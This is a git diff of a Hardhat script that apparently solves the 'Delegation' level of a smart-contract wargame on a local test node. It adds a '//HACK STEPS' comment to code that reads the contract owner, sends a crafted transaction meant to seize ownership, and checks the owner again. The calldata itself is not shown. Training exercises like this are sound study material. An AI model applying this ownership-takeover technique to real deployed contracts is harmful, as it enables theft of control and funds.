@@ -2,15 +2,15 @@ import { ethers } from "hardhat";
 import { TransactionRequest } from "@ethersproject/providers";
 import { BigNumber } from "ethers";
 
+//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
 const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
 const CONTRACT_ADDRESS = "0x80E2E2367C5E9D070Ae2d6d50bF0cdF6360a7151";
 
 async function main() {
 const signer = await ethers.getSigner(PLAYER_ADDRESS);
-
-//Fit contract name and address (current lvl instance)
 const contract = await ethers.getContractAt("Delegation",CONTRACT_ADDRESS,signer);
 
+//HACK STEPS
 
 // 1. Check owner.
 console.log("Contract owner is: ", await contract.owner())
@@ -37,7 +37,7 @@ const tx : TransactionRequest = {
 
 await signer.sendTransaction(tx);
 
-//4. Check owner again
+// 4. Check owner again
 console.log("After tx, now owner is: ", await contract.owner())
 
 }
